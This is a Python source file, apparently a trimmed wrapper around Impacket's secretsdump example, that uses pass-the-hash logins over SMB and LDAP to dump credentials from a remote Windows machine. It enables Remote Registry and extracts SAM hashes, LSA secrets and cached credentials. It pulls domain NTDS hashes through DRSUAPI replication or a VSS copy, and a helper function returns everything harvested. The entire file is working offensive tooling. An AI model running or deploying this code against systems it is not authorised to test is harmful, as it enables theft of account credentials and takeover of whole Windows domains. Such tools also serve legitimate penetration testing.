#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#




import logging
import os
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
    KeyListSecrets

try:
    input = raw_input
except NameError:
    pass

class DumpSecrets:
    def __init__(self, remoteName, username, hash):
        self.__useVSSMethod = False
        self.__useKeyListMethod = False
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = ''
        self.__domain = ''
        self.__lmhash, self.__nthash = hash.split(':')
        self.__aesKey = None
        self.__aesKeyRodc = None
        self.__smbConnection = None
        self.__ldapConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__KeyListSecrets = None
        self.__rodc = None
        self.__systemHive = None
        self.__bootkey = None
        self.__securityHive = None
        self.__samHive = None
        self.__ntdsFile = None
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = None
        self.__doKerberos = False
        self.__justDC = False
        self.__justDCNTLM = False
        self.__justUser = None
        self.__ldapFilter = None
        self.__pwdLastSet = False
        self.__printUserStatus = False
        self.__resumeFileName = None
        self.__canProcessSAMLSA = True
        self.__kdcHost = None
        self.__exec_method = 'smbexec'
        self.__output = {}

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def ldapConnect(self):
        if self.__doKerberos:
            self.__target = self.__remoteHost
        else:
            if self.__kdcHost is not None:
                self.__target = self.__kdcHost
            else:
                self.__target = self.__domain

        # Create the baseDN
        if self.__domain:
            domainParts = self.__domain.split('.')
        else:
            domain = self.__target.split('.', 1)[-1]
            domainParts = domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        try:
            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                    self.__aesKey, kdcHost=self.__kdcHost)
        except LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                        self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                if self.__ldapFilter is not None:
                    logging.info('Querying %s for information about domain users via LDAP' % self.__domain)
                    try:
                        self.ldapConnect()
                    except Exception as e:
                        logging.error('LDAP connection failed: %s' % str(e))
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__ldapConnection)
                    self.__remoteOps.setExecMethod(self.__exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
            if self.__useKeyListMethod is True:
                try:
                    self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
                    self.__KeyListSecrets.dump()
                except Exception as e:
                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
            else:
                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                    try:
                        if self.__isRemote is True:
                            SAMFileName = self.__remoteOps.saveSAM()
                        else:
                            SAMFileName = self.__samHive

                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                        self.__output.update(self.__SAMHashes.dump())
                        if self.__outputFileName is not None:
                            self.__SAMHashes.export(self.__outputFileName)
                    except Exception as e:
                        logging.error('SAM hashes extraction failed: %s' % str(e))

                    try:
                        if self.__isRemote is True:
                            SECURITYFileName = self.__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.__securityHive

                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                       isRemote=self.__isRemote, history=self.__history)
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportCached(self.__outputFileName)
                        self.__LSASecrets.dumpSecrets()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportSecrets(self.__outputFileName)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        logging.error('LSA hashes extraction failed: %s' % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.__isRemote is True:
                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
                        NTDSFileName = self.__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.__ntdsFile

                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
                                               ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)
                try:
                    self.__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                        logging.info("You just got that error because there might be some duplicates of the same name. "
                                     "Try specifying the domain name for the user as well. It is important to specify it "
                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                    elif self.__useVSSMethod is False:
                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
                self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass
        return self.__output

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__KeyListSecrets:
            self.__KeyListSecrets.finish()


def Get_users_hashes(host, username, hash):
    dumper = DumpSecrets(host, username, hash)
    return dumper.dump()
